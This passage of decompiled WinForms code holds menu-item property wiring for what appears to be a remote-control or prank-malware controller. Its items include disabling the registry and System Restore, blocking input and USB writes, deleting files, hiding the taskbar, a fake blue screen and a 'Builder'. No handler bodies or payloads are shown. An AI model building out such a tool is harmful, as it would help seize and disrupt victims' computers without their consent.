        if (this._DisableToolStripMenuItem2 == null)
          return;
        this._DisableToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisableRegistryToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DisableRegistryToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._DisableRegistryToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem EnableToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._EnableToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnableToolStripMenuItem1_Click);
        if (this._EnableToolStripMenuItem1 != null)
          this._EnableToolStripMenuItem1.Click -= eventHandler;
        this._EnableToolStripMenuItem1 = value;
        if (this._EnableToolStripMenuItem1 == null)
          return;
        this._EnableToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisableToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._DisableToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DisableToolStripMenuItem1_Click);
        if (this._DisableToolStripMenuItem1 != null)
          this._DisableToolStripMenuItem1.Click -= eventHandler;
        this._DisableToolStripMenuItem1 = value;
        if (this._DisableToolStripMenuItem1 == null)
          return;
        this._DisableToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SystemRestoreToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SystemRestoreToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._SystemRestoreToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem EnableToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._EnableToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnableToolStripMenuItem_Click);
        if (this._EnableToolStripMenuItem != null)
          this._EnableToolStripMenuItem.Click -= eventHandler;
        this._EnableToolStripMenuItem = value;
        if (this._EnableToolStripMenuItem == null)
          return;
        this._EnableToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisableToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DisableToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DisableToolStripMenuItem_Click);
        if (this._DisableToolStripMenuItem != null)
          this._DisableToolStripMenuItem.Click -= eventHandler;
        this._DisableToolStripMenuItem = value;
        if (this._DisableToolStripMenuItem == null)
          return;
        this._DisableToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem APIToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._APIToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._APIToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem MonitorToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._MonitorToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._MonitorToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem TurnOnToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._TurnOnToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOnToolStripMenuItem_Click);
        if (this._TurnOnToolStripMenuItem != null)
          this._TurnOnToolStripMenuItem.Click -= eventHandler;
        this._TurnOnToolStripMenuItem = value;
        if (this._TurnOnToolStripMenuItem == null)
          return;
        this._TurnOnToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TurnOffToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._TurnOffToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOffToolStripMenuItem_Click);
        if (this._TurnOffToolStripMenuItem != null)
          this._TurnOffToolStripMenuItem.Click -= eventHandler;
        this._TurnOffToolStripMenuItem = value;
        if (this._TurnOffToolStripMenuItem == null)
          return;
        this._TurnOffToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem KeyboardMouseToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._KeyboardMouseToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._KeyboardMouseToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem BlockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._BlockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BlockToolStripMenuItem_Click);
        if (this._BlockToolStripMenuItem != null)
          this._BlockToolStripMenuItem.Click -= eventHandler;
        this._BlockToolStripMenuItem = value;
        if (this._BlockToolStripMenuItem == null)
          return;
        this._BlockToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem UnblockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._UnblockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UnblockToolStripMenuItem_Click);
        if (this._UnblockToolStripMenuItem != null)
          this._UnblockToolStripMenuItem.Click -= eventHandler;
        this._UnblockToolStripMenuItem = value;
        if (this._UnblockToolStripMenuItem == null)
          return;
        this._UnblockToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem PCToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._PCToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PCToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem StatusToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._StatusToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._StatusToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShutdownToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ShutdownToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShutdownToolStripMenuItem_Click);
        if (this._ShutdownToolStripMenuItem != null)
          this._ShutdownToolStripMenuItem.Click -= eventHandler;
        this._ShutdownToolStripMenuItem = value;
        if (this._ShutdownToolStripMenuItem == null)
          return;
        this._ShutdownToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RestartToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RestartToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RestartToolStripMenuItem_Click);
        if (this._RestartToolStripMenuItem != null)
          this._RestartToolStripMenuItem.Click -= eventHandler;
        this._RestartToolStripMenuItem = value;
        if (this._RestartToolStripMenuItem == null)
          return;
        this._RestartToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem StandByToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._StandByToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.StandByToolStripMenuItem_Click);
        if (this._StandByToolStripMenuItem != null)
          this._StandByToolStripMenuItem.Click -= eventHandler;
        this._StandByToolStripMenuItem = value;
        if (this._StandByToolStripMenuItem == null)
          return;
        this._StandByToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HibernationToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._HibernationToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HibernationToolStripMenuItem_Click);
        if (this._HibernationToolStripMenuItem != null)
          this._HibernationToolStripMenuItem.Click -= eventHandler;
        this._HibernationToolStripMenuItem = value;
        if (this._HibernationToolStripMenuItem == null)
          return;
        this._HibernationToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CDRomToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CDRomToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CDRomToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem OpenToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OpenToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenToolStripMenuItem_Click);
        if (this._OpenToolStripMenuItem != null)
          this._OpenToolStripMenuItem.Click -= eventHandler;
        this._OpenToolStripMenuItem = value;
        if (this._OpenToolStripMenuItem == null)
          return;
        this._OpenToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CloseToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CloseToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CloseToolStripMenuItem_Click);
        if (this._CloseToolStripMenuItem != null)
          this._CloseToolStripMenuItem.Click -= eventHandler;
        this._CloseToolStripMenuItem = value;
        if (this._CloseToolStripMenuItem == null)
          return;
        this._CloseToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem Mouse00ToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._Mouse00ToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Mouse00ToolStripMenuItem_Click);
        if (this._Mouse00ToolStripMenuItem != null)
          this._Mouse00ToolStripMenuItem.Click -= eventHandler;
        this._Mouse00ToolStripMenuItem = value;
        if (this._Mouse00ToolStripMenuItem == null)
          return;
        this._Mouse00ToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem BlockSiteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._BlockSiteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BlockSiteToolStripMenuItem_Click);
        if (this._BlockSiteToolStripMenuItem != null)
          this._BlockSiteToolStripMenuItem.Click -= eventHandler;
        this._BlockSiteToolStripMenuItem = value;
        if (this._BlockSiteToolStripMenuItem == null)
          return;
        this._BlockSiteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CloseProcessToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CloseProcessToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CloseProcessToolStripMenuItem_Click);
        if (this._CloseProcessToolStripMenuItem != null)
          this._CloseProcessToolStripMenuItem.Click -= eventHandler;
        this._CloseProcessToolStripMenuItem = value;
        if (this._CloseProcessToolStripMenuItem == null)
          return;
        this._CloseProcessToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DeleteFileToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DeleteFileToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteFileToolStripMenuItem_Click);
        if (this._DeleteFileToolStripMenuItem != null)
          this._DeleteFileToolStripMenuItem.Click -= eventHandler;
        this._DeleteFileToolStripMenuItem = value;
        if (this._DeleteFileToolStripMenuItem == null)
          return;
        this._DeleteFileToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SetIEHomePageToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SetIEHomePageToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SetIEHomePageToolStripMenuItem_Click);
        if (this._SetIEHomePageToolStripMenuItem != null)
          this._SetIEHomePageToolStripMenuItem.Click -= eventHandler;
        this._SetIEHomePageToolStripMenuItem = value;
        if (this._SetIEHomePageToolStripMenuItem == null)
          return;
        this._SetIEHomePageToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SetClipboardToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SetClipboardToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SetClipboardToolStripMenuItem_Click);
        if (this._SetClipboardToolStripMenuItem != null)
          this._SetClipboardToolStripMenuItem.Click -= eventHandler;
        this._SetClipboardToolStripMenuItem = value;
        if (this._SetClipboardToolStripMenuItem == null)
          return;
        this._SetClipboardToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DwarOnScreenToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DwarOnScreenToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DwarOnScreenToolStripMenuItem_Click);
        if (this._DwarOnScreenToolStripMenuItem != null)
          this._DwarOnScreenToolStripMenuItem.Click -= eventHandler;
        this._DwarOnScreenToolStripMenuItem = value;
        if (this._DwarOnScreenToolStripMenuItem == null)
          return;
        this._DwarOnScreenToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DesktopToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DesktopToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._DesktopToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem LockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._LockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.LockToolStripMenuItem_Click);
        if (this._LockToolStripMenuItem != null)
          this._LockToolStripMenuItem.Click -= eventHandler;
        this._LockToolStripMenuItem = value;
        if (this._LockToolStripMenuItem == null)
          return;
        this._LockToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem UnlockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._UnlockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UnlockToolStripMenuItem_Click);
        if (this._UnlockToolStripMenuItem != null)
          this._UnlockToolStripMenuItem.Click -= eventHandler;
        this._UnlockToolStripMenuItem = value;
        if (this._UnlockToolStripMenuItem == null)
          return;
        this._UnlockToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ClockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ClockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ClockToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ShowToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem_Click);
        if (this._ShowToolStripMenuItem != null)
          this._ShowToolStripMenuItem.Click -= eventHandler;
        this._ShowToolStripMenuItem = value;
        if (this._ShowToolStripMenuItem == null)
          return;
        this._ShowToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._HideToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem_Click);
        if (this._HideToolStripMenuItem != null)
          this._HideToolStripMenuItem.Click -= eventHandler;
        this._HideToolStripMenuItem = value;
        if (this._HideToolStripMenuItem == null)
          return;
        this._HideToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem NotifyToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._NotifyToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._NotifyToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._ShowToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem1_Click);
        if (this._ShowToolStripMenuItem1 != null)
          this._ShowToolStripMenuItem1.Click -= eventHandler;
        this._ShowToolStripMenuItem1 = value;
        if (this._ShowToolStripMenuItem1 == null)
          return;
        this._ShowToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._HideToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem1_Click);
        if (this._HideToolStripMenuItem1 != null)
          this._HideToolStripMenuItem1.Click -= eventHandler;
        this._HideToolStripMenuItem1 = value;
        if (this._HideToolStripMenuItem1 == null)
          return;
        this._HideToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CleanRecycleBinToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CleanRecycleBinToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CleanRecycleBinToolStripMenuItem_Click);
        if (this._CleanRecycleBinToolStripMenuItem != null)
          this._CleanRecycleBinToolStripMenuItem.Click -= eventHandler;
        this._CleanRecycleBinToolStripMenuItem = value;
        if (this._CleanRecycleBinToolStripMenuItem == null)
          return;
        this._CleanRecycleBinToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CloseToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._CloseToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CloseToolStripMenuItem1_Click);
        if (this._CloseToolStripMenuItem1 != null)
          this._CloseToolStripMenuItem1.Click -= eventHandler;
        this._CloseToolStripMenuItem1 = value;
        if (this._CloseToolStripMenuItem1 == null)
          return;
        this._CloseToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual MenuStrip menubar
    {
      [DebuggerNonUserCode] get => this._menubar;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ToolStripItemClickedEventHandler clickedEventHandler = new ToolStripItemClickedEventHandler(this.menubar_ItemClicked);
        if (this._menubar != null)
          this._menubar.ItemClicked -= clickedEventHandler;
        this._menubar = value;
        if (this._menubar == null)
          return;
        this._menubar.ItemClicked += clickedEventHandler;
      }
    }

    internal virtual ToolStripMenuItem MenuToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._MenuToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._MenuToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ExitToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ExitToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ExitToolStripMenuItem_Click);
        if (this._ExitToolStripMenuItem != null)
          this._ExitToolStripMenuItem.Click -= eventHandler;
        this._ExitToolStripMenuItem = value;
        if (this._ExitToolStripMenuItem == null)
          return;
        this._ExitToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem FocusToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FocusToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FocusToolStripMenuItem_Click);
        if (this._FocusToolStripMenuItem != null)
          this._FocusToolStripMenuItem.Click -= eventHandler;
        this._FocusToolStripMenuItem = value;
        if (this._FocusToolStripMenuItem == null)
          return;
        this._FocusToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SoundToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SoundToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._SoundToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem MuteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._MuteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.MuteToolStripMenuItem_Click);
        if (this._MuteToolStripMenuItem != null)
          this._MuteToolStripMenuItem.Click -= eventHandler;
        this._MuteToolStripMenuItem = value;
        if (this._MuteToolStripMenuItem == null)
          return;
        this._MuteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ProcessSusResToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ProcessSusResToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ProcessSusResToolStripMenuItem_Click);
        if (this._ProcessSusResToolStripMenuItem != null)
          this._ProcessSusResToolStripMenuItem.Click -= eventHandler;
        this._ProcessSusResToolStripMenuItem = value;
        if (this._ProcessSusResToolStripMenuItem == null)
          return;
        this._ProcessSusResToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TaskbarToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._TaskbarToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TaskbarToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._ShowToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem2_Click);
        if (this._ShowToolStripMenuItem2 != null)
          this._ShowToolStripMenuItem2.Click -= eventHandler;
        this._ShowToolStripMenuItem2 = value;
        if (this._ShowToolStripMenuItem2 == null)
          return;
        this._ShowToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._HideToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem2_Click);
        if (this._HideToolStripMenuItem2 != null)
          this._HideToolStripMenuItem2.Click -= eventHandler;
        this._HideToolStripMenuItem2 = value;
        if (this._HideToolStripMenuItem2 == null)
          return;
        this._HideToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem IconsToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._IconsToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._IconsToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._ShowToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem3_Click);
        if (this._ShowToolStripMenuItem3 != null)
          this._ShowToolStripMenuItem3.Click -= eventHandler;
        this._ShowToolStripMenuItem3 = value;
        if (this._ShowToolStripMenuItem3 == null)
          return;
        this._ShowToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._HideToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem3_Click);
        if (this._HideToolStripMenuItem3 != null)
          this._HideToolStripMenuItem3.Click -= eventHandler;
        this._HideToolStripMenuItem3 = value;
        if (this._HideToolStripMenuItem3 == null)
          return;
        this._HideToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ChangeProcessTitleToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ChangeProcessTitleToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ChangeProcessTitleToolStripMenuItem_Click);
        if (this._ChangeProcessTitleToolStripMenuItem != null)
          this._ChangeProcessTitleToolStripMenuItem.Click -= eventHandler;
        this._ChangeProcessTitleToolStripMenuItem = value;
        if (this._ChangeProcessTitleToolStripMenuItem == null)
          return;
        this._ChangeProcessTitleToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem USBWriteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._USBWriteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._USBWriteToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem BlockToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._BlockToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BlockToolStripMenuItem1_Click);
        if (this._BlockToolStripMenuItem1 != null)
          this._BlockToolStripMenuItem1.Click -= eventHandler;
        this._BlockToolStripMenuItem1 = value;
        if (this._BlockToolStripMenuItem1 == null)
          return;
        this._BlockToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem UnblockToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._UnblockToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UnblockToolStripMenuItem1_Click);
        if (this._UnblockToolStripMenuItem1 != null)
          this._UnblockToolStripMenuItem1.Click -= eventHandler;
        this._UnblockToolStripMenuItem1 = value;
        if (this._UnblockToolStripMenuItem1 == null)
          return;
        this._UnblockToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem BuilderToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._BuilderToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BuilderToolStripMenuItem_Click);
        if (this._BuilderToolStripMenuItem != null)
          this._BuilderToolStripMenuItem.Click -= eventHandler;
        this._BuilderToolStripMenuItem = value;
        if (this._BuilderToolStripMenuItem == null)
          return;
        this._BuilderToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SettingsToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SettingsToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SettingsToolStripMenuItem_Click);
        if (this._SettingsToolStripMenuItem != null)
          this._SettingsToolStripMenuItem.Click -= eventHandler;
        this._SettingsToolStripMenuItem = value;
        if (this._SettingsToolStripMenuItem == null)
          return;
        this._SettingsToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SetTimeToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SetTimeToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SetTimeToolStripMenuItem_Click);
        if (this._SetTimeToolStripMenuItem != null)
          this._SetTimeToolStripMenuItem.Click -= eventHandler;
        this._SetTimeToolStripMenuItem = value;
        if (this._SetTimeToolStripMenuItem == null)
          return;
        this._SetTimeToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem InfoToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._InfoToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.InfoToolStripMenuItem_Click);
        if (this._InfoToolStripMenuItem != null)
          this._InfoToolStripMenuItem.Click -= eventHandler;
        this._InfoToolStripMenuItem = value;
        if (this._InfoToolStripMenuItem == null)
          return;
        this._InfoToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem FunnyToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FunnyToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._FunnyToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem FakeBSODToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FakeBSODToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._FakeBSODToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem ShowToolStripMenuItem4
    {
      [DebuggerNonUserCode] get => this._ShowToolStripMenuItem4;
